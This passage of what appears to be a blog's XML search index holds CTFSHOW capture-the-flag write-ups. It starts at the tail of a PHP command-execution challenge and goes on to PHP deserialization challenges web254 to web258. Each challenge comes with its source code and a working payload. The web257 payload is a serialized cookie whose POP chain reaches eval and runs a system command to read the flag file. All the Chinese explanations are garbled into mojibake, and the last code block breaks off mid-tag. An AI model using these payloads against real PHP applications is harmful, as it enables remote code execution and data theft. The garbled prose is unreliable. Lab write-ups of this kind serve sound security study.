   <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›¸å½“äºæŠŠå‰ä¸¤é“é¢˜çš„æºç ç»™å‡ºæ¥äº†</p><p>payloadåŒä¸Š</p><p>`${PWD::$</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> CTFSHOW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW ååºåˆ—åŒ–</title>
      <link href="/2023/07/26/CTFSHOW%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/07/26/CTFSHOW%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web254"><a href="#web254" class="headerlink" title="web254()"></a>web254()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?username=xxxxxx&amp;password=xxxxxx</code></p><ul><li>çœ‹ä¸€è¾¹ä»£ç å‘ç°åªéœ€è¦è®©usernameå’Œpasswordå€¼ä¸€æ ·å°±è¡Œã€‚</li><li>ç›´æ¥ä¼ å‚</li></ul><h1 id="web255"><a href="#web255" class="headerlink" title="web255()"></a>web255()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br><span class="line"></span><br><span class="line">Cookie</span><br><span class="line">user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><ul><li>é¦–å…ˆgetä¾æ—§ä¼ å…¥ä¸Šé¢˜payloadï¼Œä½†æ˜¯æœ¬é¢˜å¤šäº†ä¸€ä¸ªCookieçš„å€¼ã€‚</li><li>æ ¹æ®é¢˜æ„ï¼Œæ„å»ºä¸€ä¸ªå¯¹è±¡ï¼Œä¸”usernameå’Œpasswordå€¼ä¸ºxxxxxxï¼ŒisVipçš„å€¼åº”ä¸ºtrueï¼Œæ‰èƒ½ä¾æ¬¡æ‰§è¡Œä¸Šè¿°åŠŸèƒ½</li><li>å°†åºåˆ—åŒ–åçš„å€¼ä¼ å…¥å‘ç°æ— ååº”ï¼Œè¯•ç€å°†åºåˆ—åŒ–å†…å®¹urlç¼–ç ï¼Œç»“æœæˆåŠŸï¼</li></ul><h1 id="web256"><a href="#web256" class="headerlink" title="web256()"></a>web256()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxxa</span><br><span class="line"></span><br><span class="line">Cookie user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>xxxxxxa%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><ul><li>å‘ç°æœ¬é¢˜usernameå’Œpasswordä¸ä¸€æ ·æ‰å¯ä»¥è¾“å‡ºflag</li><li>å°†æ„å»ºçš„Cookieä»¥åŠgetä¸­ä¸­usernameå’Œpasswordçš„å€¼ä¿®æ”¹ä¸ºä¸ä¸€æ ·ï¼Œå³å¯è¾“å‡ºflag</li></ul><h1 id="web257-POPé“¾æ„é€ "><a href="#web257-POPé“¾æ„é€ " class="headerlink" title="web257(POPé“¾æ„é€ )"></a>web257(POPé“¾æ„é€ )</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx </span><br><span class="line">    </span><br><span class="line">Cookie user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>backDoor%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">22</span>cat+flag.php%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><ul><li>è§‚å¯Ÿä»£ç å‘ç°éœ€è¦æ„é€ POPé“¾</li><li>éœ€è¦æ”¹å€¼çš„åªæœ‰backDoorç±»ä¸­çš„codeå€¼ä»¥åŠè®©å…¶è°ƒç”¨getInfoæ–¹æ³•ã€‚</li><li>å‘ç°<code>__construct __destruct</code>é­”æœ¯æ–¹æ³•ï¼Œåœ¨åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–ä¼šè§¦å‘ï¼Œä½¿å…¶æ‰§è¡Œclasså±æ€§ä¸­çš„getInfoæ–¹æ³•ã€‚</li><li>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©classå±æ€§æ”¹å˜å³å¯ã€‚å°†å…¶å€¼æ”¹ä¸ºbackDoorç±»çš„å¯¹è±¡ï¼Œåœ¨åºåˆ—åŒ–/ååºåˆ—åŒ–å°±ä¼šè°ƒç”¨classä¹Ÿå°±æ˜¯backDoorä¸­çš„getInfoæ–¹æ³•ã€‚</li><li>æœ€åæ”¹çš„å€¼åªæœ‰backDoorç±»ä¸­çš„codeå±æ€§çš„å€¼ã€‚</li></ul><h1 id="web258-æ­£åˆ™ç»•è¿‡"><a href="#web258-æ­£åˆ™ç»•è¿‡" class="headerlink" title="web258(+æ­£åˆ™ç»•è¿‡)"></a>web258(+æ­£åˆ™ç»•è¿‡)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 